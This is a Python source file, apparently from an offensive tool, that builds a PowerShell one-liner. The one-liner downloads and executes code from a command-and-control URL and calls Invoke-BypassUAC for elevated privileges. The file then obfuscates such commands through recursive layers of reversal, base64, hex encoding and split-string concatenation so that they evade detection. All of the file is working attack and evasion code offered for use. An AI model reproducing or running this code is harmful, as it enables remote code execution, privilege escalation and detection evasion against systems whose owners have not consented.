import base64 
import binascii
import random


def call_url(url):
    """
    Call the C2 url using the powershell command
    """
    ps_command = "powershell.exe -exec bypass -C \"IEX (New-Object Net.WebClient).DownloadString('%s');Invoke-BypassUAC -Command 'start powershell.exe'\"" % url
    return ps_command

def reverse(input):
    """reverse a string"""
    reversed_input = input[::-1]
    ps_command = "$string = \"%s\";$string[-1..-$string.Length] -join ''" % reversed_input
    return ps_command

def base64_encode(input):
    """encode the string in base64"""
    message_bytes = input.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    ps_command = '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("%s"))' \
                   % base64_bytes.decode('ascii')
    return ps_command

def hex_encode(input):
    """encode the string in hex"""
    string = input.encode('utf-8')
    string = binascii.hexlify(string).decode('ascii')
    ps_command = '$s = "%s"; -join($s-split\'(..)\'|?{$_}|%%{[char]+"0x$_"})' % string
    return ps_command


def spam(input, noise=None):
    """add random series of letters"""
    options = 'abcdefghijklmnopqrstuvwxyz{}%&*$'
    if not noise:
        letter = random.choice(options)
        noise = random.randint(4,9) * letter
    n = random.randint(1,6)
    split_string = [input[index : index + n] for index in range(0, len(input), n)]
    return noise.join(split_string)


def split_concat(input):
    """
    plit the sting into multiple portials to be joined by concatenation
    eg. 'com' + 'mand' = 'command'
    """
    # Let's espace any single quotes before doing this
    input = input.replace("'", "\\'")
    spammed = "'%s'" % spam(input, noise="' + '")
    return spammed


funcs = {
    "final_funcs":[split_concat],#, spam],
    "work_funcs":[reverse, base64_encode, hex_encode]
}

def obfuscate(input, funcs=funcs, num=3):
    """
    recursive function to obfuscate input using multiple techniques
    """
    #print (input)
    #print('\n')

    if num == 0:
        return input
    elif num == 1:
        algo =  random.choice(funcs["final_funcs"])
        output = algo(input)
    else:
        algo =  random.choice(funcs["work_funcs"])
        output = algo(input)
        
    return obfuscate(output, funcs, num - 1)

